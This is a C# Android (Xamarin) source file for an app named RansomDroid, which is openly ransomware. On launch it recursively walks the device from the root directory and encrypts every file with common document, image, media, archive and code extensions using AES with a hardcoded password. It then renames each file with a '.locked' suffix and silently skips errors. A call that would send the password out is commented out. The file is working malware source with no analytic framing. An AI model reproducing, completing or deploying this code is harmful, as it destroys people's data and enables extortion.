using Android.App;
using Android.Widget;
using Android.OS;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Linq;
using System;

namespace RansomDroid
{
    [Activity(Label = "RansomDroid", MainLauncher = true, Icon = "@drawable/icon")]
    public class MainActivity : Activity
    {
        protected override void OnCreate(Bundle bundle)
        {
            base.OnCreate(bundle);

            // Set our view from the "main" layout resource
            // SetContentView (Resource.Layout.Main);
            startcrypter();
        }

        public void EcryptFile(string file, string psswd) 
        {

            byte[] bytesToBeEcrp = File.ReadAllBytes(file);
            byte[] psswdBts = Encoding.UTF8.GetBytes(psswd);
            psswdBts = SHA256.Create().ComputeHash(psswdBts);
            byte[] bytesEcrp = AS_Ecrp(bytesToBeEcrp, psswdBts);

            File.WriteAllBytes(file, bytesEcrp);
            File.Move(file, file + ".locked");


        }


        public byte[] AS_Ecrp(byte[] bytesToBeEcrpd, byte[] pwBytes) 
        {
            byte[] ecrdBytes = null;
            byte[] saltBytes = new byte[] { 3, 4, 5, 6, 7, 8, 9, 10 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (AesManaged AES = new AesManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(pwBytes, saltBytes, 10000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.ECB;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEcrpd, 0, bytesToBeEcrpd.Length);
                        cs.Close();
                    }
                    ecrdBytes = ms.ToArray();
                }
            }

            return ecrdBytes;
        }

        public void startcrypter()
        {
            string pswrd = "password";  // CrtPsswrd(10); //  SendPsswrd(pswrd); 
            string androiddir = "//";
            //    SendPsswrd(pswrd); // 
            encrpDir(androiddir, pswrd);
            pswrd = null;
            // Application.Exit();

        }
        public void encrpDir(string location, string pswd)
        {


            var validExtensions = new[]
            {
        ".doc", ".txt", ".xls", ".docx", ".pdf", ".jpeg", ".index", ".rar", ".zip", ".lnk", ".css", ".ppt", ".xlsx", ".odt", ".pptx", ".bmp", ".jpg", ".csv", ".png", ".mdb", ".sql", ".php", ".sln", ".aspx", ".asp", ".xml", ".html", ".bk", ".psd", ".mp3", ".bat", ".wav", ".mp4", ".avi", ".wma", ".mkv", ".divx", ".wmv", ".mpeg", ".ogg", ".mov"// ".txt", ".doc", ".docx", ".xls", ".index", ".pdf", ".zip", ".rar", ".css", ".lnk", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".bmp", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".bk", ".bat", ".mp3", ".mp4", ".wav", ".wma", ".avi", ".divx", ".mkv", ".mpeg", ".wmv", ".mov", ".ogg"
            };
            string[] files = Directory.GetFiles(location);
            string[] chldDir = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                try
                {
                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension))
                    {
                        EcryptFile(files[i], pswd);
                    }
                }
                catch (SystemException)
                {
                    continue;
                }
            }

            for (int i = 0; i < chldDir.Length; i++)
            {
                try
                {
                    encrpDir(chldDir[i], pswd);
                }
                catch (SystemException)
                {
                    continue;
                }
            }


        }


    }
}

